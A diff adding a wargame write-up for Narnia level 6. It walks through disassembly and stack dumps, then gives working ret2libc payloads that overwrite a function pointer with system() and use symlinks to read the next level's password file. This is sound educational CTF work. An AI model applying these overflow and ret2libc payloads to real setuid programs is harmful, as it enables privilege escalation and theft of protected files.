@@ -1,0 +1,60 @@
+This level starts off mysterious.
+
+    narnia6@narnia:/narnia$ ./narnia6
+    ./narnia6 b1 b2
+    narnia6@narnia:/narnia$ ./narnia6 AAAA DDDD
+    AAAA
+
+Disassembling main reveals this:
+
+    0x080486d8 <+304>:	call   0x8048450 <setreuid@plt>
+    0x080486dd <+309>:	add    esp,0x8
+    0x080486e0 <+312>:	lea    eax,[ebp-0x14]
+    0x080486e3 <+315>:	push   eax
+    0x080486e4 <+316>:	mov    eax,DWORD PTR [ebp-0xc]
+    0x080486e7 <+319>:	call   eax
+
+I'm guessing that this is a function pointer call, which is run with real user ID narnia6.
+
+Let's take a look at the stack when we pop in our input. There are two strcpy calls, so we'll break after the second one,
+which probably copies argv[2].
+
+0xffffd694:	0xffffd69c	0xffffd89d	0x44444444	0xf7fc5300
+0xffffd6a4:	0x41414141	0x08048700	0x08048430	0x00000003
+
+This is interesting. After the strcpy calls, our input gets written in, but it looks like we haven't been given much
+space to work with. There's a memset that's probably wiping env, so I'd guess that the challenge is to change the function
+pointer to something. First Let's see where the program goes if we just use 4 byte values.
+
+Looks like we end up calling x08048430, located 2 words after AAAA. Supplying args AAAAAAAADDDD BBBB segfaults on this call
+successfully, so now we just need to decide what to write there. I initially tried supplying a third argument to see if
+shellcode could be loaded in argv[2], but this triggers an early exit. Looks like our best bet is a ret2libc attack.
+
+I can easily inject a call to system(), but the issue is that the parameter it receives is a pointer back to where argv[1]
+has been written on the stack, "AAAAAAAA\x50\xc8\xe4\xf7". I don't think it's the intended solution, but if we can make
+argv[1] a valid parameter for system(), the call should occur.
+
+    0xffffd698:	0xffffd6a4	0x42424242	0xf7fc5300	0x41414141
+    0xffffd6a8:	0x41414141	0x44444444	0x00000000	0x00000000
+    0xffffd6b8:	0x00000000	0xf7e2a286
+
+Looking at the stack, we've got 3 whole extra words beyond what we've written so far of extra space lying around we can
+write into as long as we leave a NULL terminator.
+
+"/tmp/AAA" + "\x50\xc8\xe4\xf7" + " /tmp/AA" should put the address of system() into our function pointer and still leave
+a whole word of NULLs to terminate our string. "/tmp/AAA" + "\x50\xc8\xe4\xf7" can be established as a symlink to /bin/cat,
+and "/tmp/AA", seperated using a space, should be supplied by system() to cat as an arg. "/tmp/AA" can be made a symlink to
+/etc/narnia_pass/narnia7 and we should be able to read the file.
+
+    narnia6@narnia:/narnia$ file /tmp/AA
+    /tmp/AA: symbolic link to /etc/narnia_pass/narnia7
+    narnia6@narnia:/narnia$ file $(perl -e 'print "/tmp/AAA" . "\x50\xc8\xe4\xf7"')
+    /tmp/AAAP���: symbolic link to /bin/cat
+
+    ./narnia6 "$(perl -e 'print "/tmp/AAA" . "\x50\xc8\xe4\xf7" . " /tmp/AA"')" DDDD
+
+
+This works, but isn't very clean. The best solution is to leverage our second strcpy to inject a NULL terminator
+before the malicious address.
+
+    ./narnia6 $(perl -e 'print "AAAAAAAA" . "\x50\xc8\xe4\xf7"') DDDDDDDDsh
